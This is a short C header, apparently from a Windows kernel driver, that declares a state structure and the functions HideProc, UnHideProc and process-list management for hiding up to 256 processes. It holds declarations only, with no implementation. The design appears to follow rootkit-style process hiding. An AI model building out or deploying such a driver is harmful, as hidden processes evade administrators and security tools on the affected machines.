#pragma once

#define MAX_PIDS 256 // maximum number of hiding processes 
#define SYSTEM_PROCESS_PID 0x4

typedef struct {
	ULONG Pids[MAX_PIDS];
	ULONG_PTR ListEntry[MAX_PIDS];
	ERESOURCE Lock; 
	ULONG PidsCount; 
} Globals;


void Globals_Init(Globals* g_state);
ULONG Globals_AddProcesses(Globals* g_state, const ULONG* pids, ULONG count);
ULONG Globals_RemoveProcesses(Globals* g_state, const ULONG* pids, ULONG count);
int Globals_FindProcess(Globals* g_state, ULONG pid);
NTSTATUS HideProc(_In_ ULONG pid, _Out_ ULONG_PTR* ListEntry);
NTSTATUS UnHideProc(_In_ Globals* g_state, ULONG index); 

NTSTATUS CompleteRequest(PIRP Irp, NTSTATUS status, ULONG_PTR info);